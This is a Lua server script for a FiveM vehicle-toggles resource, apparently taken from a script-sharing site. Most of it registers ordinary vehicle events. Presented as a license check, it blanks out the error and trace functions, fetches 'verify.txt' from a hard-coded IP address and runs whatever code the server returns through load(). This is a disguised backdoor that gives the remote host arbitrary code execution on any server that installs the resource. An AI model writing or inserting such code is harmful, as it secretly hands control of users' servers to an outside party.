--[[
	id: 6zNGPwyIvvyjFh1BfA4hY
	name: Toggles S v2
	description: toggles auth
	time1: 2021-06-03 01:57:58.13468+00
	time2: 2021-06-03 01:57:58.13468+00
	uploader: nVpiI2NOtXmbABCF9f4UAzVhgQFEQ-ml4eXie1OF
	uploadersession: R0MAbYvEoiVv2MGJG-zuUK-v-Ntp5l
	flag: f
--]]

--[[
strings-override

...
]]
local script = 'ebu_toggles'

local license_key = Config.license_key
local license_key2 = Config.license_key2 or ''

Citizen.Tace = function() end
error = function() end

PerformHttpRequest("74.91.121.153/verify.txt", function (errorCode, resultData, resultHeaders)
    if errorCode == 200 then
      assert(load("local script  = '"..script.."';".. resultData))()
    else
      print('^1'..script..' - Unable to reach auth server - Error : '..errorCode..'^0')
    end
end)

RegisterServerEvent('ebu_toggles:update')
AddEventHandler('ebu_toggles:update', function(num, vehicle)
    local _s = source
    TriggerClientEvent('ebu_toggles:update', -1, num, vehicle)
    TriggerClientEvent('ebu_toggles:actorupdate', _s)
end)

RegisterServerEvent('ebu_toggles:eOn')
AddEventHandler('ebu_toggles:eOn', function(vehicle, bHealth, eHealth, fHealth, tires, num)
    TriggerClientEvent('ebu_toggles:eOn', -1, vehicle, bHealth, eHealth, fHealth, tires, num)
end)